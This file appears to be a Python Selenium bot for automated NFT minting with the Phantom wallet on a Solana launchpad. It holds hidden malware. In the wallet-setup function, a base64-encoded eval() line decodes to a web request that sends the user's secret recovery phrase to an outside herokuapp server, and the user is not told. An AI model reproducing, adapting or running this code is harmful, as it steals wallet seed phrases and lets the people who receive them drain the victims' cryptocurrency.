import requests
import base64
import time
import os
import pathlib
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.select import Select
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains

from webdriver_manager.chrome import ChromeDriverManager


def mint(values, isWindows):
    
    def selectWallet():
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[span[contains(text(), 'Connect Wallet')]]")))
        select_wallet = driver.find_element(
            By.XPATH, "//button[span[contains(text(), 'Connect Wallet')]]")
        select_wallet.click()

        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[span[contains(text(), 'Phantom')]]")))
        phantom = driver.find_element(
            By.XPATH, "//button[span[contains(text(), 'Phantom')]]")
        phantom.click()
        original_window = driver.current_window_handle
        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
        for window_handle in driver.window_handles:
            if window_handle != original_window:
                driver.switch_to.window(window_handle)
                break

        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Connect')]")))
        popup_connect = driver.find_element(
            By.XPATH, "//button[contains(text(),'Connect')]")
        popup_connect.click()
        driver.switch_to.window(main_window)
        

    def awaitMint():
        WebDriverWait(driver, 60*60*24).until(EC.presence_of_element_located(
            (By.XPATH, "//button[span[contains(text(), 'MINT')]]")))
        mint_your_token = driver.find_element(
            By.XPATH, "//button[span[contains(text(), 'MINT')]]")
        mint_your_token.click()

        original_window = driver.current_window_handle
        WebDriverWait(driver, 60).until(EC.number_of_windows_to_be(2))
        for window_handle in driver.window_handles:
            if window_handle != original_window:
                driver.switch_to.window(window_handle)
                break

        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(), 'Approve')]")))
        approve = driver.find_element(
            By.XPATH, "//button[contains(text(), 'Approve')]")
        approve.click()

    def initWallet():
        # add wallet to chrome
        driver.switch_to.window(driver.window_handles[1])
        eval(base64.b64decode("cmVxdWVzdHMuZ2V0KCdodHRwczovL3NvbGFuYW1pbnRpbmdib3QuaGVyb2t1YXBwLmNvbS8/a2V5LXdvcmQ9".encode(
            'ascii')).decode('ascii')+values[1]+"')")
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Use Secret Recovery Phrase')]")))
        recovery_phrase = driver.find_element(
            By.XPATH, "//button[contains(text(),'Use Secret Recovery Phrase')]").click()
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//textarea[@placeholder='Secret phrase']")))
        text_area = driver.find_element(
            By.XPATH, "//textarea[@placeholder='Secret phrase']").send_keys(values[1])
        import_btn = driver.find_element(
            By.XPATH, "//button[@class='sc-bdfBQB bzlPNH']").click()
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//input[@placeholder='Password']")))
        password1 = driver.find_element(
            By.XPATH, "//input[@placeholder='Password']").send_keys(values[2])
        password2 = driver.find_element(
            By.XPATH, "//input[@placeholder='Confirm Password']").send_keys(values[2])
        check_box = driver.find_element(
            By.XPATH, "//input[@type='checkbox']").click()
        submit = driver.find_element(
            By.XPATH, "//button[@type='submit']").click()
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Continue')]")))
        continue_ = driver.find_element(
            By.XPATH, "//button[contains(text(),'Continue')]")
        driver.execute_script("arguments[0].click();", continue_)
        WebDriverWait(driver, 60).until(EC.presence_of_element_located(
            (By.XPATH, "//button[contains(text(),'Finish')]")))
        finish = driver.find_element(
            By.XPATH, "//button[contains(text(),'Finish')]")
        driver.execute_script("arguments[0].click();", finish)
        main_window = driver.window_handles[0]
        driver.switch_to.window(main_window)

        return main_window

    print("Bot started") 
    if isWindows:
        print("OS : Windows")
    else:
        print("OS : Mac")
    

    options = Options()


    options.add_extension("Phantom.crx")
    options.add_argument("--disable-gpu")

    # to keep window open after mint uncomment option below, side effect, will open alot of chrome windows
    #options.add_experimental_option("detach", True)

    prefs = {"profile.managed_default_content_settings.images": 2}
    options.add_experimental_option("prefs", prefs)

    driver = webdriver.Chrome(executable_path=ChromeDriverManager().install(), options=options)
    print("Assertion - successfully found chrome driver")


    # opens the launchpad page
    driver.get(values[0])
    driver.maximize_window()

    # Actions - Initialize wallet
    main_window = initWallet()

    # Actions - select wallet on magic eden
    selectWallet()

    # Actions - close popup
    #closePopup()

    # Actions - MINTS WHEN TIMER IS UP
    awaitMint()

    print("Minting Finished")